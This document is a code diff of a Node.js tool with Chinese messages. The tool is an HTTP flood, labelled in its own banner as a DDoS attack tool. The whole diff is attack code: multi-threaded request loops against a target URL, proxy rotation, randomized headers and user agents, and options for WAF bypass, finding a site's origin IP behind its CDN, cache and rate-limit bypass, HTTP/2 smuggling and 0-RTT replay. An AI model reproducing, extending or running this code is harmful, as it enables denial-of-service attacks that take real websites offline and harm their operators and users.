-    interval: 10,
-    requestsPerConnection: 5,
+    target: null, proxyFile: null, duration: null, threads: null,
+    method: 'GET', waf: false, randomSpeed: false, cdn: false,
+    originIP: null, cacheBypass: false, originPull: false,
+    h2Smuggle: false, zerortt: false, autoSwitch: false,
+    waffled: false, paramPollution: false, rateLimitBypass: true,
+    interval: 10, requestsPerConnection: 5,
   };
-  
+
   const argv = [...process.argv];
-  const wafIndex = argv.indexOf('--waf');
-  if (wafIndex !== -1) {
-    args.waf = true;
-    argv.splice(wafIndex, 1);
+  const flagToKey = {
+    '--waf': 'waf', '--random-speed': 'randomSpeed', '--cdn': 'cdn',
+    '--cache-bypass': 'cacheBypass', '--origin-pull': 'originPull',
+    '--h2-smuggle': 'h2Smuggle', '--zerortt': 'zerortt', '--auto-switch': 'autoSwitch',
+    '--waffled': 'waffled', '--param-pollution': 'paramPollution',
+    '--no-rate-limit-bypass': 'rateLimitBypass',
+  };
+
+  Object.entries(flagToKey).forEach(([flag, key]) => {
+    const idx = argv.indexOf(flag);
+    if (idx !== -1) {
+      if (flag === '--no-rate-limit-bypass') args.rateLimitBypass = false;
+      else args[key] = true;
+      argv.splice(idx, 1);
+    }
+  });
+
+  const oiIdx = argv.indexOf('--origin-ip');
+  if (oiIdx !== -1 && oiIdx + 1 < argv.length) {
+    args.originIP = argv[oiIdx + 1]; args.cdn = true; argv.splice(oiIdx, 2);
   }
-  
-  const randomSpeedIndex = argv.indexOf('--random-speed');
-  if (randomSpeedIndex !== -1) {
-    args.randomSpeed = true;
-    argv.splice(randomSpeedIndex, 1);
+
+  const modeIdx = argv.indexOf('--mode');
+  if (modeIdx !== -1 && modeIdx + 1 < argv.length) {
+    const mode = argv[modeIdx + 1];
+    switch (mode) {
+      case 'stealth':
+        args.waf = true; args.cacheBypass = true; args.rateLimitBypass = true;
+        break;
+      case 'aggressive':
+        args.waf = true; args.cacheBypass = true; args.originPull = true; args.rateLimitBypass = true;
+        break;
+      case 'waffled':
+        args.waf = true; args.waffled = true; args.originPull = true; args.rateLimitBypass = true;
+        break;
+      case 'full':
+        args.waf = true; args.cacheBypass = true; args.originPull = true;
+        args.waffled = true; args.paramPollution = true; args.rateLimitBypass = true;
+        break;
+    }
+    argv.splice(modeIdx, 2);
   }
-  
-  if (argv.length < 4) {
-    console.log('\x1b[31m[错误]\x1b[37m 参数不足'.error);
-    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> [代理文件] <持续时间> <线程数> [间隔(ms)] [连接请求数] [方法] [--waf] [--random-speed]'.info);
-    console.log('\x1b[33m[示例]\x1b[37m'.warn);
-    console.log('  node ' + fileName + ' http://example.com 60 100'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 5 10 GET'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf --random-speed'.warn);
-    console.log('\x1b[33m[注意]\x1b[37m'.warn);
-    console.log('  --waf: 启用WAF绕过模式'.warn);
-    console.log('  --random-speed: 启用随机速度和持续时间，同时启用多方法攻击'.warn);
-    console.log('  间隔: 请求间隔时间(毫秒)，默认10ms'.warn);
-    console.log('  连接请求数: 每个连接发送的请求数，默认5'.warn);
-    console.log('  代理文件可选: 如果不提供，将使用直接连接攻击'.warn);
+
+  // 检查最少参数：target, duration, threads (3个)
+  if (argv.length < 5) {
+    console.log('\x1b[31m[错误]\x1b[37m 参数不足，至少需要 <目标URL> <持续秒> <线程数>');
+    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> <持续秒> <线程数> [选项]');
+    console.log('\x1b[33m[快捷模式 --mode]\x1b[37m stealth / aggressive / waffled / full');
     return null;
   }
-  
+
   args.target = argv[2];
-  
-  let paramIndex = 3;
-  
-  if (paramIndex < argv.length) {
-    const secondArg = argv[paramIndex];
-    
-    if (secondArg.includes('.') && !isNaN(parseInt(secondArg.split('.')[0])) === false) {
-      args.proxyFile = secondArg;
-      paramIndex++;
-    }
+  let pi = 3;
+
+  // 可选的代理文件
+  if (pi < argv.length && argv[pi].includes('.') && isNaN(parseInt(argv[pi]))) {
+    args.proxyFile = argv[pi++];
   }
-  
-  if (paramIndex < argv.length) {
-    args.duration = parseInt(argv[paramIndex]);
-    if (isNaN(args.duration)) {
-      console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是数字'.error);
+
+  // 持续时间（必选）
+  if (pi < argv.length) {
+    const d = parseInt(argv[pi]);
+    if (isNaN(d) || d <= 0) {
+      console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是正整数，当前值: ' + argv[pi]);
       return null;
     }
-    paramIndex++;
+    args.duration = d;
+    pi++;
   } else {
-    console.log('\x1b[31m[错误]\x1b[37m 缺少持续时间参数'.error);
+    console.log('\x1b[31m[错误]\x1b[37m 缺少持续时间参数');
     return null;
   }
-  
-  if (paramIndex < argv.length) {
-    args.threads = parseInt(argv[paramIndex]);
-    if (isNaN(args.threads)) {
-      console.log('\x1b[31m[错误]\x1b[37m 线程数必须是数字'.error);
+
+  // 线程数（必选）
+  if (pi < argv.length) {
+    const t = parseInt(argv[pi]);
+    if (isNaN(t) || t <= 0) {
+      console.log('\x1b[31m[错误]\x1b[37m 线程数必须是正整数，当前值: ' + argv[pi]);
       return null;
     }
-    paramIndex++;
+    args.threads = t;
+    pi++;
   } else {
-    console.log('\x1b[31m[错误]\x1b[37m 缺少线程数参数'.error);
+    console.log('\x1b[31m[错误]\x1b[37m 缺少线程数参数');
     return null;
   }
-  
-  if (paramIndex < argv.length) {
-    const intervalArg = argv[paramIndex];
-    if (!isNaN(parseInt(intervalArg)) && intervalArg.indexOf('--') !== 0) {
-      args.interval = parseInt(intervalArg);
-      if (args.interval < 1) {
-        console.log('\x1b[31m[错误]\x1b[37m 间隔时间必须大于0'.error);
-        return null;
-      }
-      paramIndex++;
+
+  // 可选：间隔
+  if (pi < argv.length && !isNaN(parseInt(argv[pi])) && argv[pi].indexOf('--') !== 0) {
+    args.interval = parseInt(argv[pi++]);
+    if (args.interval < 1) {
+      console.log('\x1b[31m[错误]\x1b[37m 间隔必须大于0');
+      return null;
     }
   }
-  
-  if (paramIndex < argv.length) {
-    const requestsArg = argv[paramIndex];
-    if (!isNaN(parseInt(requestsArg)) && requestsArg.indexOf('--') !== 0) {
-      args.requestsPerConnection = parseInt(requestsArg);
-      if (args.requestsPerConnection < 1) {
-        console.log('\x1b[31m[错误]\x1b[37m 连接请求数必须大于0'.error);
-        return null;
-      }
-      paramIndex++;
-    }
+
+  // 可选：每连接请求数
+  if (pi < argv.length && !isNaN(parseInt(argv[pi])) && argv[pi].indexOf('--') !== 0) {
+    args.requestsPerConnection = parseInt(argv[pi++]);
   }
-  
-  if (paramIndex < argv.length) {
-    const methodArg = argv[paramIndex];
-    if (methodArg.indexOf('--') !== 0) {
-      args.method = methodArg.toUpperCase();
-      paramIndex++;
-    }
+
+  // 可选：方法
+  if (pi < argv.length && argv[pi].indexOf('--') !== 0) {
+    args.method = argv[pi++].toUpperCase();
   }
-  
+
   return args;
 }
 
-function sendThroughProxyEnhanced(proxyHost, proxyPort, target, parsed, methods, wafBypass, requestsPerConnection, callback) {
-  const socket = new net.Socket();
-  socket.setTimeout(5000);
-  
-  socket.once('connect', () => {
-    for (let i = 0; i < Math.min(methods.length, requestsPerConnection); i++) {
-      const method = methods[i % methods.length];
-      const request = buildWAFBypassRequest(target, parsed, method, wafBypass);
-      socket.write(request);
-    }
-    callback(true);
-  });
-  
-  socket.once('error', (err) => {
-    callback(false);
-  });
-  
-  socket.once('timeout', () => {
-    socket.destroy();
-    callback(false);
-  });
-  
-  socket.on('data', (data) => {
-    setTimeout(() => {
-      socket.destroy();
-    }, 3000);
-  });
-  
-  socket.on('close', () => {
-  });
-  
-  try {
-    socket.connect(proxyPort, proxyHost);
-  } catch (err) {
-    callback(false);
-  }
-}
-
-function buildWAFBypassRequest(target, parsed, method, wafBypass) {
-  const host = parsed.hostname;
-  const randomMethod = wafBypass.getRandomMethod(method);
-  const randomPath = wafBypass.getRandomPath(parsed.pathname + parsed.search);
-  
-  const headers = wafBypass.getRandomHeaders(randomMethod);
-  headers['Host'] = host;
-  headers['User-Agent'] = wafBypass.getRandomUserAgent();
-  
-  if (Math.random() > 0.5) {
-    const cookies = wafBypass.generateRandomCookies();
-    if (cookies) {
-      headers['Cookie'] = cookies;
-    }
-  }
-  
-  const requestLine = `${randomMethod} ${randomPath} HTTP/1.1\r\n`;
-  
-  let requestHeaders = '';
-  for (const [key, value] of Object.entries(headers)) {
-    requestHeaders += `${key}: ${value}\r\n`;
-  }
-  
-  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(randomMethod) && Math.random() > 0.3) {
-    const body = wafBypass.getMethodSpecificBody(randomMethod);
-    requestHeaders += `Content-Length: ${Buffer.byteLength(body)}\r\n`;
-    return requestLine + requestHeaders + '\r\n' + body;
-  }
-  
-  return requestLine + requestHeaders + '\r\n';
-}
-
-function sendDirectRequestEnhanced(isHttps, host, port, path, methods, wafBypass, callback) {
-  const method = methods[Math.floor(Math.random() * methods.length)];
+// ==================== 请求发送 ====================
+function sendDirectRequest(isHttps, host, port, path, method, wafBypass, callback, proxyManager) {
   const randomMethod = wafBypass.getRandomMethod(method);
   const randomPath = wafBypass.getRandomPath(path);
-  
   const headers = wafBypass.getRandomHeaders(randomMethod);
   headers['Host'] = host;
   headers['User-Agent'] = wafBypass.getRandomUserAgent();
-  
-  if (Math.random() > 0.5) {
-    const cookies = wafBypass.generateRandomCookies();
-    if (cookies) {
-      headers['Cookie'] = cookies;
-    }
-  }
-  
+  if (Math.random() > 0.5) headers['Cookie'] = wafBypass.generateRandomCookies();
+
   const options = {
-    hostname: host,
-    port: port,
-    path: randomPath,
-    method: randomMethod,
-    headers: headers,
-    timeout: 5000
+    hostname: host, port: port, path: randomPath,
+    method: randomMethod, headers: headers,
+    timeout: 5000, rejectUnauthorized: false,
   };
-  
-  if (['POST', 'PUT', 'PATCH', 'DELETE'].includes(randomMethod) && Math.random() > 0.3) {
-    const body = wafBypass.getMethodSpecificBody(randomMethod);
-    options.headers['Content-Length'] = Buffer.byteLength(body);
+
+  let body = null;
+  if (['POST', 'PUT', 'PATCH'].includes(randomMethod)) {
+    body = wafBypass.getMethodSpecificBody(randomMethod);
+    if (body) options.headers['Content-Length'] = Buffer.byteLength(body);
   }
-  
-  const req = (isHttps ? https : http).request(options, (res) => {
+
+  const req = (isHttps ? https : http).request(options, res => {
     res.on('data', () => {});
-    res.on('end', () => {
-      callback(true);
-    });
+    res.on('end', () => callback(true));
   });
-  
-  req.on('error', (err) => {
-    callback(false);
-  });
-  
-  req.on('timeout', () => {
-    req.destroy();
-    callback(false);
-  });
-  
-  if (options.headers['Content-Length']) {
-    const body = wafBypass.getMethodSpecificBody(randomMethod);
-    req.write(body);
-  }
-  
+  req.on('error', () => callback(false));
+  req.on('timeout', () => { req.destroy(); callback(false); });
+  if (body) req.write(body);
   req.end();
 }
 
-function enhancedAttackWorker(id, target, parsed, method, proxies, useProxies, wafBypass, speedController, multiMethodManager, workerDuration, interval, requestsPerConnection, callback) {
-  let workerRequests = 0;
-  let workerFailed = 0;
-  const host = parsed.hostname;
-  const port = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
-  const isHttps = parsed.protocol === 'https:';
-  const path = parsed.pathname + parsed.search;
-  
-  const endTime = Date.now() + workerDuration;
-  let isRunning = true;
-  
-  const attackLoop = () => {
-    if (!isRunning || Date.now() >= endTime) {
-      isRunning = false;
-      callback(workerRequests, workerFailed);
-      return;
-    }
-    
-    const currentInterval = speedController ? speedController.getCurrentInterval() : interval;
-    
-    const concurrentMethods = multiMethodManager.generateConcurrentMethods(method);
-    
-    if (useProxies && proxies.length > 0) {
-      const proxy = proxies[Math.floor(Math.random() * proxies.length)];
-      
-      sendThroughProxyEnhanced(proxy.host, proxy.port, target, parsed, concurrentMethods, wafBypass, requestsPerConnection, (success) => {
-        if (success) {
-          workerRequests += Math.min(concurrentMethods.length, requestsPerConnection);
-        } else {
-          workerFailed += Math.min(concurrentMethods.length, requestsPerConnection);
-        }
-      });
-    } else {
-      let completed = 0;
-      let successCount = 0;
-      let failCount = 0;
-      
-      const checkCompletion = () => {
-        if (completed === concurrentMethods.length) {
-          workerRequests += successCount;
-          workerFailed += failCount;
-        }
-      };
-      
-      concurrentMethods.forEach(methodToUse => {
-        sendDirectRequestEnhanced(isHttps, host, port, path, [methodToUse], wafBypass, (success) => {
-          completed++;
-          if (success) {
-            successCount++;
-          } else {
-            failCount++;
-          }
-          checkCompletion();
-        });
-      });
-    }
-    
-    setTimeout(attackLoop, currentInterval);
-  };
-  
-  attackLoop();
-  
-  if (useProxies) {
-    const directLoop = () => {
-      if (!isRunning || Date.now() >= endTime) {
-        return;
-      }
-      
-      const concurrentMethods = multiMethodManager.generateConcurrentMethods(method);
-      
-      let completed = 0;
-      let successCount = 0;
-      let failCount = 0;
-      
-      const checkCompletion = () => {
-        if (completed === concurrentMethods.length) {
-          workerRequests += successCount;
-          workerFailed += failCount;
-        }
-      };
-      
-      concurrentMethods.forEach(methodToUse => {
-        sendDirectRequestEnhanced(isHttps, host, port, path, [methodToUse], wafBypass, (success) => {
-          completed++;
-          if (success) {
-            successCount++;
-          } else {
-            failCount++;
-          }
-          checkCompletion();
-        });
-      });
-      
-      const directInterval = speedController ? speedController.getCurrentInterval() * 2 : interval * 2;
-      setTimeout(directLoop, directInterval);
-    };
-    
-    directLoop();
-  }
-  
-  return () => {
-    isRunning = false;
-  };
-}
-
-function startEnhancedAttack() {
+// ==================== 主攻击函数 ====================
+async function startAttack() {
   const args = parseArguments();
-  if (!args) {
-    process.exit(1);
-  }
-  
-  const target = args.target;
-  const proxyFile = args.proxyFile;
-  const duration = args.duration;
-  const threads = args.threads;
-  const method = args.method;
-  const wafEnabled = args.waf;
-  const randomSpeedEnabled = args.randomSpeed;
-  const interval = args.interval;
-  const requestsPerConnection = args.requestsPerConnection;
+  if (!args) process.exit(1);
 
-  if (!target) {
-    console.log('\x1b[31m[错误]\x1b[37m 目标URL是必须的'.error);
-    process.exit(1);
-  }
+  let { target, proxyFile, duration, threads, method, waf, randomSpeed, cdn, originIP,
+        cacheBypass, originPull, h2Smuggle, zerortt, autoSwitch, interval,
+        waffled, paramPollution, rateLimitBypass } = args;
 
-  if (!target.startsWith('http://') && !target.startsWith('https://')) {
-    console.log('\x1b[31m[错误]\x1b[37m 目标必须以 http:// 或 https:// 开头'.error);
-    process.exit(1);
-  }
-
+  // 防御性校验，防止 NaN 传播
   if (isNaN(duration) || duration <= 0) {
-    console.log('\x1b[31m[错误]\x1b[37m 持续时间必须是正整数'.error);
+    console.log('\x1b[31m[错误]\x1b[37m 持续时间无效，请检查参数');
     process.exit(1);
   }
-
   if (isNaN(threads) || threads <= 0) {
-    console.log('\x1b[31m[错误]\x1b[37m 线程数必须是正整数'.error);
-    process.exit(1);
-  }
-
-  if (interval < 1) {
-    console.log('\x1b[31m[错误]\x1b[37m 间隔时间必须大于0'.error);
-    process.exit(1);
-  }
-
-  if (requestsPerConnection < 1) {
-    console.log('\x1b[31m[错误]\x1b[37m 连接请求数必须大于0'.error);
+    console.log('\x1b[31m[错误]\x1b[37m 线程数无效，请检查参数');
     process.exit(1);
   }
 
   let parsed;
-  try {
-    parsed = new URL(target);
-  } catch (err) {
-    console.log('\x1b[31m[错误]\x1b[37m 无效的URL: ' + err.message.error);
-    process.exit(1);
-  }
+  try { parsed = new URL(target); } catch (err) { console.log('无效URL'); process.exit(1); }
 
-  let proxies = [];
-  let useProxies = false;
-  
+  let actualHost = parsed.hostname;
+  let actualPort = parsed.port || (parsed.protocol === 'https:' ? 443 : 80);
+  let actualIsHttps = parsed.protocol === 'https:';
+  let cdnHeaders = {};
+
+  // 加载代理
+  let proxyManager = null;
   if (proxyFile) {
     try {
-      const proxyContent = fs.readFileSync(proxyFile, 'utf-8');
-      proxies = proxyContent
-        .replace(/\r/g, '')
-        .split('\n')
-        .filter(line => line.trim() !== '')
-        .map(line => {
-          const parts = line.trim().split(':');
-          return {
-            host: parts[0],
-            port: parseInt(parts[1]) || 80
-          };
-        });
-      
-      if (proxies.length === 0) {
-        console.log(`\x1b[33m[警告]\x1b[37m 代理文件为空，将使用直接连接`.warn);
-      } else {
-        useProxies = true;
-        console.log(`\x1b[36m[加载]\x1b[37m 成功加载 ${proxies.length} 个代理`.info);
+      if (fs.existsSync(proxyFile)) {
+        const content = fs.readFileSync(proxyFile, 'utf-8');
+        const proxyList = content.replace(/\r/g, '').split('\n')
+          .filter(line => line.trim() !== '' && line.includes(':'));
+        proxyManager = new SmartProxyManager(proxyList, { strategy: 'adaptive' });
+        console.log(`\n\x1b[36m[代理]\x1b[37m 加载 ${proxyList.length} 个代理，自适应评分管理`);
       }
+    } catch (e) {
+      console.log(`\x1b[33m[代理]\x1b[37m 加载失败: ${e.message}`);
+    }
+  }
+
+  // 阶段0：CDN穿透
+  if (cdn) {
+    if (originIP) {
+      actualHost = originIP;
+      console.log(`\n\x1b[35m[CDN穿透]\x1b[37m 手动源站IP: ${originIP}`);
+    } else {
+      try {
+        const engine = new AdvancedCDNBypassEngine(parsed.hostname);
+        const found = await engine.run();
+        cdnHeaders = engine.getInjectionHeaders();
+        if (found) actualHost = found;
+      } catch (err) {
+        console.log(`\x1b[31m[CDN穿透异常]\x1b[37m ${err.message}，跳过`);
+      }
+    }
+  }
+
+  // 阶段1：HTTP/2走私
+  if (h2Smuggle) {
+    try {
+      const smuggler = new H2SmugglingExecutor(actualHost, actualPort);
+      await smuggler.runAllPayloads();
     } catch (err) {
-      if (err.code === 'ENOENT') {
-        console.log(`\x1b[33m[警告]\x1b[37m 代理文件不存在: ${proxyFile}，将使用直接连接`.warn);
-      } else {
-        console.log(`\x1b[33m[警告]\x1b[37m 读取代理文件失败: ${err.message}，将使用直接连接`.warn);
-      }
+      console.log(`\x1b[31m[H2走私异常]\x1b[37m ${err.message}，跳过`);
     }
-  } else {
-    console.log('\x1b[33m[信息]\x1b[37m 未提供代理文件，使用直接连接攻击'.info);
   }
 
-  const wafBypass = new EnhancedWAFBypass(wafEnabled, randomSpeedEnabled);
-  
+  // 阶段2：0-RTT重放
+  if (zerortt) {
+    try {
+      const replayEngine = new ZeroRTTReplayEngine(actualHost, actualPort);
+      const replayResult = await replayEngine.runFullAttack(method);
+      console.log(`\n\x1b[35m[0-RTT结果]\x1b[37m ${replayResult.success ? '\x1b[31m存在漏洞' : '\x1b[32m安全'}\x1b[37m`);
+    } catch (err) {
+      console.log(`\x1b[31m[0-RTT异常]\x1b[37m ${err.message}，跳过此阶段继续攻击`);
+    }
+  }
+
+  // 阶段3：WAF绕过引擎初始化
+  const wafBypass = new EnhancedWAFBypass({
+    enabled: waf || cdn || cacheBypass || originPull || waffled || paramPollution,
+    randomSpeedEnabled: randomSpeed,
+    cdnHeaders: cdnHeaders,
+    cacheBypassEnabled: cacheBypass,
+    originPullEnabled: originPull,
+    rateLimitBypassEnabled: rateLimitBypass,
+    waffledEnabled: waffled,
+    paramPollutionEnabled: paramPollution,
+  });
+
   const baseDuration = duration * 1000;
-  const workerDurations = [];
-  const speedControllers = [];
-  const multiMethodManagers = [];
+  const speedController = randomSpeed ? new EnhancedRandomSpeedController() : { getCurrentInterval: () => interval };
+  const startTime = Date.now();
+  const endTime = startTime + baseDuration;
+
+  const stats = { totalRequests: 0, failedRequests: 0 };
+
+  // 自动武器切换
+  if (autoSwitch) {
+    const weapons = [
+      { name: 'WAF绕过', description: 'Header混淆+UA轮换', enabled: () => { wafBypass.techniques.headerVariation = true; } },
+      { name: '缓存穿透', description: '随机参数+Cache-Control操纵', enabled: () => { wafBypass.techniques.cacheBypass = true; } },
+      { name: '动态回源', description: 'API路径优先+动态参数', enabled: () => { wafBypass.techniques.originPull = true; } },
+      { name: 'WAFFLED混合', description: '解析差异+Content-Type切换', enabled: () => {
+        wafBypass.techniques.waffledMultipart = true;
+        wafBypass.techniques.waffledJSON = true;
+        wafBypass.techniques.paramPollution = true;
+      }},
+      { name: '全武器', description: '所有技术同时启用', enabled: () => {
+        wafBypass.techniques.headerVariation = true;
+        wafBypass.techniques.cacheBypass = true;
+        wafBypass.techniques.originPull = true;
+        wafBypass.techniques.waffledMultipart = true;
+        wafBypass.techniques.waffledJSON = true;
+        wafBypass.techniques.paramPollution = true;
+      }},
+    ];
+    const switcher = new AutoWeaponSwitcher(actualHost, actualPort, weapons);
+    switcher.startAutoSwitch((weapon) => weapon.enabled());
+  }
+
+  console.log(`\n╔══════════════════════════════════════╗`);
+  console.log(`║          攻击参数                    ║`);
+  console.log(`╚══════════════════════════════════════╝\n`);
+  console.log(`目标: ${actualHost}:${actualPort}`);
+  console.log(`方法: ${method} | 时长: ${duration}s | 线程: ${threads}`);
+  console.log(`WAF绕过: ${waf ? '✅' : '❌'} | CDN穿透: ${cdn ? '✅' : '❌'}`);
+  console.log(`缓存穿透: ${cacheBypass ? '✅' : '❌'} | 动态回源: ${originPull ? '✅' : '❌'}`);
+  console.log(`速率绕过: ${rateLimitBypass ? '✅' : '❌'} | WAFFLED: ${waffled ? '✅' : '❌'}`);
+  console.log(`参数污染: ${paramPollution ? '✅' : '❌'} | 代理: ${proxyManager ? '✅' : '❌'}`);
+  console.log(`H2走私: ${h2Smuggle ? '✅' : '❌'} | 0-RTT: ${zerortt ? '✅' : '❌'}`);
+  console.log(`自动切换: ${autoSwitch ? '✅' : '❌'} | 随机速度: ${randomSpeed ? '✅' : '❌'}\n`);
+
+  console.log('\x1b[33m[启动] 攻击开始，按 Ctrl+C 停止\n');
+
+  // 启动工作线程
   const stopFunctions = [];
-  
   for (let i = 0; i < threads; i++) {
-    const workerDuration = randomSpeedEnabled 
-      ? RandomDurationGenerator.getRandomDuration(40, Math.max(40, Math.ceil(duration / 60)))
-      : baseDuration;
-    
-    workerDurations.push(workerDuration);
-    speedControllers.push(randomSpeedEnabled ? new EnhancedRandomSpeedController(true) : { getCurrentInterval: () => interval });
-    multiMethodManagers.push(new MultiMethodAttackManager(wafBypass, speedControllers[i]));
-  }
-  
-  const maxWorkerDuration = Math.max(...workerDurations);
-  const totalDuration = randomSpeedEnabled ? maxWorkerDuration : baseDuration;
-  
-  console.log(`
-╔══════════════════════════════════════════════════════════════╗
-║                     DDoS 攻击启动                           ║
-╚══════════════════════════════════════════════════════════════╝`.attack);
-
-  console.log(`\x1b[36m[目标]\x1b[37m     ${target}`.info);
-  console.log(`\x1b[36m[主机]\x1b[37m     ${parsed.hostname}:${parsed.port || (parsed.protocol === 'https:' ? 443 : 80)}`.info);
-  console.log(`\x1b[36m[协议]\x1b[37m     ${parsed.protocol.replace(':', '')}`.info);
-  console.log(`\x1b[36m[方法]\x1b[37m     ${method}`.info);
-  console.log(`\x1b[36m[总时长]\x1b[37m   ${RandomDurationGenerator.formatDuration(totalDuration)}`.info);
-  console.log(`\x1b[36m[线程]\x1b[37m     ${threads} 个`.info);
-  console.log(`\x1b[36m[间隔]\x1b[37m     ${interval}ms (${Math.round(1000/interval)} 请求/秒)`.info);
-  console.log(`\x1b[36m[连接请求数]\x1b[37m ${requestsPerConnection} 个`.info);
-  console.log(`\x1b[36m[代理]\x1b[37m     ${useProxies ? '是 (' + proxies.length + ' 个)' : '否 (直接连接)'}`.info);
-  console.log(`\x1b[36m[WAF绕过]\x1b[37m ${wafEnabled ? '✅ 已启用' : '❌ 未启用'}`.bypass);
-  console.log(`\x1b[36m[随机速度]\x1b[37m ${randomSpeedEnabled ? '✅ 已启用' : '❌ 未启用'}`.random);
-  
-  if (randomSpeedEnabled) {
-    console.log(`\x1b[36m[线程时长]\x1b[37m 每个线程随机40分钟到${RandomDurationGenerator.formatDuration(maxWorkerDuration)}`.info);
-    console.log(`\x1b[36m[速度变化]\x1b[37m 间隔1-100ms随机，30秒-3分钟变化一次`.info);
-    console.log(`\x1b[36m[多方法攻击]\x1b[37m 已启用，随机并发1-3个HTTP方法`.method);
-  }
-  
-  console.log('');
-
-  const endTime = Date.now() + totalDuration;
-  setTimeout(() => {
-    console.log('\n\x1b[33m[完成] 攻击时间结束，正在关闭...\x1b[37m'.warn);
-    stopFunctions.forEach(stop => stop());
-    process.exit(0);
-  }, totalDuration);
-
-  let totalRequests = 0;
-  let failedRequests = 0;
-  let startTime = Date.now();
-  let workerStats = [];
-  let globalMethodStats = {};
-
-  for (let i = 0; i < threads; i++) {
-    const startDelay = Math.random() * 10000;
-    
     setTimeout(() => {
-      const stopFunction = enhancedAttackWorker(
-        i + 1,
-        target,
-        parsed,
-        method,
-        proxies,
-        useProxies,
-        wafBypass,
-        speedControllers[i],
-        multiMethodManagers[i],
-        workerDurations[i],
-        interval,
-        requestsPerConnection,
-        (sent, failed) => {
-          totalRequests += sent;
-          failedRequests += failed;
-          workerStats[i] = { sent, failed };
-          
-          const stats = multiMethodManagers[i].getMethodStats();
-          for (const [method, count] of Object.entries(stats)) {
-            if (!globalMethodStats[method]) {
-              globalMethodStats[method] = 0;
-            }
-            globalMethodStats[method] += count;
-          }
-        }
-      );
-      
-      stopFunctions.push(stopFunction);
-      
-      console.log(`\x1b[33m[线程${i+1}启动]\x1b[37m 时长: ${RandomDurationGenerator.formatDuration(workerDurations[i])}`.random);
-      
-    }, startDelay);
+      let isRunning = true;
+      const loop = () => {
+        if (!isRunning || Date.now() >= endTime) { isRunning = false; return; }
+        const currentInterval = speedController.getCurrentInterval();
+        sendDirectRequest(actualIsHttps, actualHost, actualPort, '/', method, wafBypass, (success) => {
+          stats.totalRequests++;
+          if (!success) stats.failedRequests++;
+        }, proxyManager);
+        setTimeout(loop, currentInterval);
+      };
+      loop();
+      stopFunctions.push(() => { isRunning = false; });
+      console.log(`\x1b[33m[线程${i+1}]\x1b[37m 已启动`);
+    }, Math.random() * 5000);
   }
 
-  console.log('\x1b[33m[启动] 攻击开始，按 Ctrl+C 停止\x1b[37m\n'.warn);
-  
+  // 实时统计
   let lastTotal = 0;
-  const statsInterval = setInterval(() => {
+  const statsTimer = setInterval(() => {
+    const rate = stats.totalRequests - lastTotal;
+    lastTotal = stats.totalRequests;
     const elapsed = (Date.now() - startTime) / 1000;
-    const currentRate = Math.round((totalRequests - lastTotal) / 1);
-    const avgRate = elapsed > 0 ? Math.round(totalRequests / elapsed) : 0;
-    lastTotal = totalRequests;
-    
-    const progress = ((Date.now() - (endTime - totalDuration)) / totalDuration * 100).toFixed(1);
-    
-    let speedInfo = '';
-    if (speedControllers[0]) {
-      speedInfo = ` | 当前速度: ${speedControllers[0].getSpeedDescription ? speedControllers[0].getSpeedDescription() : `${Math.round(1000/interval)} 请求/秒 (间隔: ${interval}ms)`}`;
-    }
-    
-    console.log('\x1b[36m[统计]\x1b[37m'.info + 
-      ` 请求: ${totalRequests} | 失败: ${failedRequests} | 当前: ${currentRate}/s | 平均: ${avgRate}/s | 进度: ${progress}%${speedInfo}`.stats);
-    
+    const avgRate = elapsed > 0 ? Math.round(stats.totalRequests / elapsed) : 0;
+    const progress = ((Date.now() - startTime) / baseDuration * 100).toFixed(1);
+    const failRate = stats.totalRequests + stats.failedRequests > 0
+      ? (stats.failedRequests / (stats.totalRequests + stats.failedRequests) * 100).toFixed(1) : '0.0';
+
+    console.log(`\x1b[36m[统计]\x1b[37m 请求:${stats.totalRequests} 失败:${stats.failedRequests}(${failRate}%) 当前:${rate}/s 平均:${avgRate}/s 进度:${progress}%`);
+
     if (Date.now() >= endTime) {
-      clearInterval(statsInterval);
-      stopFunctions.forEach(stop => stop());
-      showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxies.length, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, globalMethodStats);
+      clearInterval(statsTimer);
+      stopFunctions.forEach(fn => fn());
+      const elapsed = (Date.now() - startTime) / 1000;
+      console.log(`\n\x1b[32m✅ 攻击完成\x1b[37m 总请求:${stats.totalRequests} 失败:${stats.failedRequests} 成功率:${stats.totalRequests > 0 ? ((stats.totalRequests - stats.failedRequests) / stats.totalRequests * 100).toFixed(2) : 0}% 时长:${elapsed.toFixed(2)}s`);
+      process.exit(0);
     }
   }, 1000);
 
-  process.on('SIGINT', () => {
-    console.log('\n\x1b[33m[停止] 收到停止信号，正在终止攻击...\x1b[37m'.warn);
-    clearInterval(statsInterval);
-    stopFunctions.forEach(stop => stop());
-    showFinalStats(totalRequests, failedRequests, startTime, useProxies, proxies.length, wafEnabled, randomSpeedEnabled, interval, requestsPerConnection, globalMethodStats);
-    process.exit(0);
-  });
+  setTimeout(() => { clearInterval(statsTimer); stopFunctions.forEach(fn => fn()); process.exit(0); }, baseDuration + 2000);
+  process.on('SIGINT', () => { clearInterval(statsTimer); stopFunctions.forEach(fn => fn()); process.exit(0); });
 }
 
 function main() {
-  const isCLI = require.main === module;
-  const hasArgs = process.argv.length > 2;
-  
-  if (isCLI && !hasArgs) {
-    console.log('\n\x1b[31m[错误]\x1b[37m 参数不足'.error);
-    console.log('\x1b[36m[用法]\x1b[37m node ' + fileName + ' <目标URL> [代理文件] <持续时间> <线程数> [间隔(ms)] [连接请求数] [方法] [--waf] [--random-speed]'.info);
-    console.log('\x1b[33m[示例]\x1b[37m'.warn);
-    console.log('  node ' + fileName + ' http://example.com 60 100'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 5 10 GET'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf'.warn);
-    console.log('  node ' + fileName + ' http://example.com proxies.txt 60 100 1 50 GET --waf --random-speed'.warn);
-    console.log('\x1b[33m[注意]\x1b[37m'.warn);
